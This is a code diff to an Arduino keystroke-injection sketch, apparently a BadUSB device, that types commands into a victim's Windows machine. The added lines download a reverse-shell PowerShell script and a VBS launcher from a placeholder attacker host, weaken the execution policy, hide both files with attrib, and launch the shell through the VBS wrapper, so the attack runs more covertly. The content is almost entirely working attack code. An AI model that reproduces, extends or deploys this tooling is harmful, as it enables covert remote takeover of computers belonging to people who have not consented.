@@ -26,17 +26,23 @@ void setup() {
   pressKey(KEY_LEFT_ARROW);
   pressKey(KEY_RETURN);
 
-  //set address to ur reverse shell file 
+  //set address to ur reverse shell file and vbs file
+  delay(1000);
+  Keyboard.println("wget \"http://<address_to_your_file>/hidden.vbs\" -outfile \"C:\\hidden.vbs\"");
   delay(1000);
   Keyboard.println("wget \"http://<address_to_your_file>/rev.ps1\" -outfile \"C:\\rev.ps1\"");
 
   delay(1000);
   Keyboard.println("Set-ExecutionPolicy RemoteSigned -Force");
   delay(500);
+  Keyboard.println("attrib +h \"C:\\hidden.vbs\"");
+  delay(500);
+  Keyboard.println("attrib +h \"C:\\rev.ps1\"");
+  delay(500);
   Keyboard.println("exit");
 
   pressWinR();
-  Keyboard.println("PowerShell.exe -NoLogo -NonInteractive -WindowStyle Hidden -File \"C:\\rev.ps1\"");
+  Keyboard.println("\"C:\\hidden.vbs\"");
 }
 
 
